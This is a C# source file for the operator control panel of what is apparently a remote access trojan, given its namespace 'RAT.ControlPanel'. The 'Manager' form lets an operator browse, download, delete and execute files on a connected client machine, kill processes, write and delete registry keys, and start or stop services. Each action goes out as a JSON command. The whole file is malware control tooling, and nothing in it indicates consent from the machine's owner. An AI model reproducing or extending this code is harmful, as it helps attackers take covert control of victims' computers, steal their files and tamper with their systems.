using System;
using System.Drawing;
using System.Windows.Forms;
using System.Threading.Tasks;
using Newtonsoft.Json;
using RAT.Shared.Models;

namespace RAT.ControlPanel.Forms
{
    public partial class frmManager : Form
    {
        private ClientInfo client;
        private MainForm mainForm;
        
        public frmManager(ClientInfo client, MainForm mainForm)
        {
            this.client = client;
            this.mainForm = mainForm;
            InitializeComponent();
            this.Text = $"Manager - {client.ClientId}";
            
            // MainForm에 이 폼 등록
            mainForm.RegisterForm(client.ClientId, this);
        }
        
        private void frmManager_Load(object sender, EventArgs e)
        {
            // 초기화
            LoadFileManager();
            LoadProcessManager();
            LoadRegistryEditor();
            LoadServiceManager();
        }
        
        // ===== File Manager =====
        
        private async void LoadFileManager()
        {
            await SendCommand(new { type = "file_list", path = "C:\\" });
        }
        
        private void btnFileRefresh_Click(object sender, EventArgs e)
        {
            LoadFileManager();
        }
        
        private async void btnFileDownload_Click(object sender, EventArgs e)
        {
            if (listViewFiles.SelectedItems.Count == 0) return;
            
            string path = listViewFiles.SelectedItems[0].SubItems[0].Text;
            await SendCommand(new { type = "file_download", path = path });
        }
        
        private async void btnFileDelete_Click(object sender, EventArgs e)
        {
            if (listViewFiles.SelectedItems.Count == 0) return;
            
            string path = listViewFiles.SelectedItems[0].SubItems[0].Text;
            if (MessageBox.Show($"Delete {path}?", "Confirm", MessageBoxButtons.YesNo) == DialogResult.Yes)
            {
                await SendCommand(new { type = "file_delete", path = path });
            }
        }
        
        private async void btnFileExecute_Click(object sender, EventArgs e)
        {
            if (listViewFiles.SelectedItems.Count == 0) return;
            
            string path = listViewFiles.SelectedItems[0].SubItems[0].Text;
            await SendCommand(new { type = "file_execute", path = path });
        }
        
        // ===== Process Manager =====
        
        private async void LoadProcessManager()
        {
            await SendCommand(new { type = "process_list" });
        }
        
        private void btnProcessRefresh_Click(object sender, EventArgs e)
        {
            LoadProcessManager();
        }
        
        private async void btnProcessKill_Click(object sender, EventArgs e)
        {
            if (listViewProcesses.SelectedItems.Count == 0) return;
            
            int pid = int.Parse(listViewProcesses.SelectedItems[0].SubItems[1].Text);
            if (MessageBox.Show($"Kill process {pid}?", "Confirm", MessageBoxButtons.YesNo) == DialogResult.Yes)
            {
                await SendCommand(new { type = "process_kill", pid = pid });
            }
        }
        
        // ===== Registry Editor =====
        
        private async void LoadRegistryEditor()
        {
            // 레지스트리 루트 키 로드
            treeViewRegistry.Nodes.Clear();
            TreeNode computer = new TreeNode("Computer");
            computer.Nodes.Add(new TreeNode("HKEY_CLASSES_ROOT"));
            computer.Nodes.Add(new TreeNode("HKEY_CURRENT_USER"));
            computer.Nodes.Add(new TreeNode("HKEY_LOCAL_MACHINE"));
            computer.Nodes.Add(new TreeNode("HKEY_USERS"));
            computer.Nodes.Add(new TreeNode("HKEY_CURRENT_CONFIG"));
            treeViewRegistry.Nodes.Add(computer);
            computer.Expand();
        }
        
        private async void treeViewRegistry_AfterSelect(object sender, TreeViewEventArgs e)
        {
            string path = e.Node.FullPath.Replace("Computer\\", "");
            await SendCommand(new { type = "registry_read", path = path });
        }
        
        private async void btnRegistryWrite_Click(object sender, EventArgs e)
        {
            if (treeViewRegistry.SelectedNode == null) return;
            
            string path = treeViewRegistry.SelectedNode.FullPath.Replace("Computer\\", "");
            string name = txtRegistryName.Text;
            string value = txtRegistryValue.Text;
            
            await SendCommand(new { type = "registry_write", path = path, name = name, value = value });
        }
        
        private async void btnRegistryDelete_Click(object sender, EventArgs e)
        {
            if (treeViewRegistry.SelectedNode == null) return;
            
            string path = treeViewRegistry.SelectedNode.FullPath.Replace("Computer\\", "");
            if (MessageBox.Show($"Delete {path}?", "Confirm", MessageBoxButtons.YesNo) == DialogResult.Yes)
            {
                await SendCommand(new { type = "registry_delete", path = path });
            }
        }
        
        // ===== Service Manager =====
        
        private async void LoadServiceManager()
        {
            await SendCommand(new { type = "service_list" });
        }
        
        private void btnServiceRefresh_Click(object sender, EventArgs e)
        {
            LoadServiceManager();
        }
        
        private async void btnServiceStart_Click(object sender, EventArgs e)
        {
            if (listViewServices.SelectedItems.Count == 0) return;
            
            string name = listViewServices.SelectedItems[0].SubItems[0].Text;
            await SendCommand(new { type = "service_start", name = name });
        }
        
        private async void btnServiceStop_Click(object sender, EventArgs e)
        {
            if (listViewServices.SelectedItems.Count == 0) return;
            
            string name = listViewServices.SelectedItems[0].SubItems[0].Text;
            await SendCommand(new { type = "service_stop", name = name });
        }
        
        // ===== 명령 전송 =====
        
        private async Task SendCommand(object command)
        {
            await mainForm.SendCommand(client, command);
        }
        
        // ===== 응답 처리 =====
        
        public void HandleResponse(dynamic response)
        {
            if (InvokeRequired)
            {
                Invoke(new Action(() => HandleResponse(response)));
                return;
            }
            
            string type = response.type.ToString();
            
            switch (type)
            {
                case "file_list":
                    UpdateFileList(response.data);
                    break;
                case "process_list":
                    UpdateProcessList(response.data);
                    break;
                case "registry_read":
                    UpdateRegistryView(response.data);
                    break;
                case "service_list":
                    UpdateServiceList(response.data);
                    break;
            }
        }
        
        private void UpdateFileList(dynamic data)
        {
            listViewFiles.Items.Clear();
            foreach (var file in data)
            {
                var item = new ListViewItem(file.name.ToString());
                item.SubItems.Add(file.size.ToString());
                item.SubItems.Add(file.modified.ToString());
                listViewFiles.Items.Add(item);
            }
        }
        
        private void UpdateProcessList(dynamic data)
        {
            listViewProcesses.Items.Clear();
            foreach (var process in data)
            {
                var item = new ListViewItem(process.name.ToString());
                item.SubItems.Add(process.pid.ToString());
                item.SubItems.Add(process.memory.ToString());
                listViewProcesses.Items.Add(item);
            }
        }
        
        private void UpdateRegistryView(dynamic data)
        {
            listViewRegistry.Items.Clear();
            foreach (var entry in data)
            {
                var item = new ListViewItem(entry.name.ToString());
                item.SubItems.Add(entry.type.ToString());
                item.SubItems.Add(entry.value.ToString());
                listViewRegistry.Items.Add(item);
            }
        }
        
        private void UpdateServiceList(dynamic data)
        {
            listViewServices.Items.Clear();
            foreach (var service in data)
            {
                var item = new ListViewItem(service.name.ToString());
                item.SubItems.Add(service.displayName.ToString());
                item.SubItems.Add(service.status.ToString());
                listViewServices.Items.Add(item);
            }
        }
    }
}
